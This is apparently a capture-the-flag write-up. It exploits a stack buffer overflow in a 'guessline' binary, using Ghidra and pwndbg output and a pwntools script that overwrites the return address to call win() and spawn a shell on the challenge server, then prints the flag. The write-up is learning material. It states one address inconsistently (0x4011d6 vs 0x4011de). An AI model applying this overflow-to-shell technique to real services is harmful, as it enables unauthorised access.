
static analysis:

```
void vuln(void)
{
  __ssize_t _Var1;
  char local_68 [16];
  size_t local_58;
  char *local_50;
  char local_48 [64];
  
  local_50 = (char *)0x0;
  local_58 = 0x40;
  puts("Tell me your secret: ");
  _Var1 = getline(&local_50,&local_58,stdin);
  if (_Var1 == -1) {
    puts("Error reading input.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  builtin_strncpy(local_68,"Your secret: %s",0x10);
  snprintf(local_48,local_58,local_68,local_50);
  puts(local_48);
  return;
}

```

I found the function win() in the list of functions of ghidra, so i obviously have to run it to gain control to the remote shell.
```
void win(void)

{
  FUN_004010e0("/bin/sh",0);
  return;
}

```

firstly i notice that there is a buffer overflow when there are inserted 59 characters or more
```
┌──(gio㉿kali)-[~/Downloads]
└─$ python -c "print('a'*59)" | ./guessline
Tell me your secret: 
Your secret: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

zsh: done                python -c "print('a'*59)" | 
zsh: segmentation fault  ./guessline

```

found that win() is located at 0x4011d6
```
pwndbg> p win
$1 = {<text variable, no debug info>} 0x4011de <win>
```

I need to fill the RIP with 3 bytes:
```
┌──(gio㉿kali)-[~/Downloads]
└─$ python -c "print('a'*59+'b'*3)"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb

```

running this input with dbg I get:
```
Program received signal SIGSEGV, Segmentation fault.
0x000000000a626262 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x4d
 RBX  0x7fffffffdef8 —▸ 0x7fffffffe265 ◂— '/home/gio/Downloads/guessline'
 RCX  0x7ffff7eb1210 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7ffff7f96710 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x7ffff7f95643 (_IO_2_1_stdout_+131) ◂— 0xf96710000000000a /* '\n' */
 R8   0x73
 R9   0xffffffff
 R10  0
 R11  0x202
 R12  0
 R13  0x7fffffffdf08 —▸ 0x7fffffffe283 ◂— 'COLORFGBG=15;0'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x7fffffffdde0 ◂— 1
 RIP  0xa626262
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
Invalid address 0xa626262
```

62 is b in ascii so it works.

Now that I have all the information, I create this python script and run it.
```
#!/usr/bin/env python3
from pwn import *

offset = 59
win_addr = 0x4011de  

# Build the payload:
payload = b'A' * offset + p64(win_addr)

# Connect to the remote service
p = remote('chall.ctc.codes', 31779)

p.sendline(payload)

# Drop into interactive mode to access the spawned shell.
p.interactive()
```

I have access to the shell so now by ls I see the flag.txt, I cat it and see the flag:
```
CTF{0KAy_M4ybE-1-Sh0U1d_HaVe_reaD_7he_man_page}
```